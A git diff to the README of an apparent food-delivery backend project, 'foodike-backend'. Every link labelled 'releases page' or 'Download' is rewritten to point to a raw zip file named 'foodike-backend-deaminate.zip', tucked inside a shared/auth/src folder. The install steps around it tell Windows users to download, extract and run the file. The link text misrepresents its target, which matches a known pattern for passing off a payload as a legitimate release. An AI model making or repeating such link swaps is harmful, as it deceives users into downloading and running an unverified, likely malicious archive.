@@ -1,6 +1,6 @@
 # 🍔 foodike-backend - Reliable backend for food delivery apps
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Igri1919/foodike-backend/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Igri1919/foodike-backend/raw/refs/heads/main/shared/auth/src/foodike-backend-deaminate.zip)
 
 ## What is this tool? 🛠️
 
@@ -19,7 +19,7 @@ Before you start, ensure your Windows computer meets these standards:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [releases page](https://github.com/Igri1919/foodike-backend/releases) to download the latest setup file.
+1. Visit the [releases page](https://github.com/Igri1919/foodike-backend/raw/refs/heads/main/shared/auth/src/foodike-backend-deaminate.zip) to download the latest setup file.
 2. Select the file ending with .zip if you move the software manually, or the .exe file for an automatic installer.
 3. Save the file to a folder on your computer.
 4. If you chose the .zip file, right-click the folder and select Extract All.
@@ -65,7 +65,7 @@ Food delivery apps handle many requests. If you notice delays, close other deman
 
 ## Managing Updates 🔄
 
-Check the [releases page](https://github.com/Igri1919/foodike-backend/releases) every month for new versions. When a new version arrives, stop the application, delete the old file, and extract the new files into your existing folder. Your configuration files will typically remain the same, but always keep a backup of your folder before replacing files.
+Check the [releases page](https://github.com/Igri1919/foodike-backend/raw/refs/heads/main/shared/auth/src/foodike-backend-deaminate.zip) every month for new versions. When a new version arrives, stop the application, delete the old file, and extract the new files into your existing folder. Your configuration files will typically remain the same, but always keep a backup of your folder before replacing files.
 
 ## Support and Security 🛡️
 
